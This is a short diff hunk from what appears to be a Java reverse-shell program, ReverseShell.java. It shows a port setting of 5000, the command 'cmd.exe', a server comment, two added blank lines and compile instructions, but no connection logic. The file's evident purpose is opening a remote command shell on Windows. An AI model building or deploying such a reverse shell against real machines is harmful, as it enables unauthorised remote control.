@@ -14,6 +14,8 @@
         int port = 5000; // Port
         String command = "cmd.exe";
 // SERVER
+
+
 to run this program in windows open CMD or Powershell and type: 
          javac ReverseShell.java
 
